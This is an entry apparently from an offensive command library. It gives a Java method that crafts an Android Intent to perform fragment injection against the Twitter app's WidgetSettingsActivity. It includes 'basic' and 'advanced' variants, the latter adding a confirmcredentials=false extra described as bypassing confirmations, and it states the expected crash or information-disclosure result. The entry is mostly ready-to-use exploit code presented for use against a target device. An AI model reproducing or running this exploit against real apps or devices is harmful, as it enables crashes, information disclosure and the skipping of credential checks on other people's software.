---
id: cmd-test-twitter-injection
data: >-
  private void testtwitter(){ Intent i = new Intent();
  i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
  i.setClassName("com.twitter.android","com.twitter.android.WidgetSettingsActivity");
  i.putExtra(":android:show_fragment","com.samsung.android.sdk.pen.objectruntime.preload.VideoIntentFragment");
  //i.putExtra("confirmcredentials",false); startActivity(i); }
tags:
  - exploit
  - android
  - intent
type: command
output: null
executor: java
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:39.287Z'
verified: false
validated: true
submitted: true
---
# test-twitter-fragment-injection

## Command

```java
private void testtwitter() {
    Intent i = new Intent();
    i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
    i.setClassName("com.twitter.android", "com.twitter.android.WidgetSettingsActivity");
    i.putExtra(":android:show_fragment", "com.samsung.android.sdk.pen.objectruntime.preload.VideoIntentFragment");
    // i.putExtra("confirmcredentials", false);
    startActivity(i);
}
```

## Description

This Java method creates and starts a malicious Intent targeting the Twitter Android app's WidgetSettingsActivity to inject an arbitrary fragment, exploiting Fragment Injection for crash or info disclosure. Use in an Android app context on the target device.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| setClassName | Specifies the target package and class (com.twitter.android, com.twitter.android.WidgetSettingsActivity) | Yes |
| :android:show_fragment | Extra key to inject the fragment class name (e.g., com.samsung.android.sdk.pen.objectruntime.preload.VideoIntentFragment) | Yes |
| confirmcredentials | Optional extra to bypass confirmations (commented out) | No |
| FLAG_ACTIVITY_CLEAR_TASK | Flag to clear the activity stack before launch | Yes |

## Examples

### Basic Usage

```java
private void testtwitter() {
    Intent i = new Intent();
    i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
    i.setClassName("com.twitter.android", "com.twitter.android.WidgetSettingsActivity");
    i.putExtra(":android:show_fragment", "com.samsung.android.sdk.pen.objectruntime.preload.VideoIntentFragment");
    startActivity(i);
}
```

### Advanced Usage

```java
private void testtwitter() {
    Intent i = new Intent();
    i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NEW_TASK);
    i.setClassName("com.twitter.android", "com.twitter.android.WidgetSettingsActivity");
    i.putExtra(":android:show_fragment", "arbitrary.fragment.ClassName");
    i.putExtra("confirmcredentials", false);
    startActivity(i);
}
```

## Expected Output

The Twitter app attempts to load the injected fragment, resulting in a crash (visible via logcat, e.g., "FATAL EXCEPTION: main java.lang.RuntimeException: Unable to start activity") or invocation of the fragment leading to unexpected behavior like info disclosure.

## Related

- [[Related Procedure: Craft-Malicious-Intent-for-Fragment-Injection]]
